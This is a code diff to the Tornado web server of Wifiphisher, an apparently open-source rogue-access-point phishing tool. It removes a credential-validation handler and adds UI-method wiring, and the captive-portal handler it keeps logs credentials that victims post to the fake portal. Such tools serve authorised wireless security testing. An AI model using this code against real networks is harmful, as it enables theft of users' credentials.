@@ -2,6 +2,7 @@ import logging
 import tornado.ioloop
 import tornado.web
 import os.path
+import wifiphisher.common.uimethods as uimethods
 from wifiphisher.common.constants import *
 
 hn = logging.NullHandler()
@@ -18,24 +19,6 @@ class DowngradeToHTTP(tornado.web.RequestHandler):
 
     def get(self):
         self.redirect("http://10.0.0.1:8080/")
-
-
-class ValidateHandler(tornado.web.RequestHandler):
-
-    def initialize(self, em):
-        self.em = em
-
-    def get(self, cred_type, cred_content):
-        """
-        Override the get method
-
-        :param self: A tornado.web.RequestHandler object
-        :type self: tornado.web.RequestHandler
-        :return: None
-        :rtype: None
-        """
-        value = self.em.verify_cred((cred_type, cred_content))
-        self.write("%s" % value)
 
 
 class CaptivePortalHandler(tornado.web.RequestHandler):
@@ -84,7 +67,6 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
 
         # check if this is a valid phishing post request
         if self.request.headers["Content-Type"].startswith(VALID_POST_CONTENT_TYPE):
-
             post_data = tornado.escape.url_unescape(self.request.body)
             # log the data
             log_file_path = "/tmp/wifiphisher-webserver.tmp"
@@ -99,14 +81,19 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
 def runHTTPServer(ip, port, ssl_port, t, em):
     global template
     template = t
+
+    # Get all the UI funcs and set them to uimethods module
+    for f in em.get_ui_funcs():
+        setattr(uimethods, f.__name__, f)
+
     app = tornado.web.Application(
         [
-            (r"/validate/([^/]+)/([^/]+)", ValidateHandler, {"em": em}),
             (r"/.*", CaptivePortalHandler)
         ],
         template_path=template.get_path(),
         static_path=template.get_path_static(),
-        compiled_template_cache=False
+        compiled_template_cache=False,
+        ui_methods=uimethods
     )
     app.listen(port, address=ip)
 
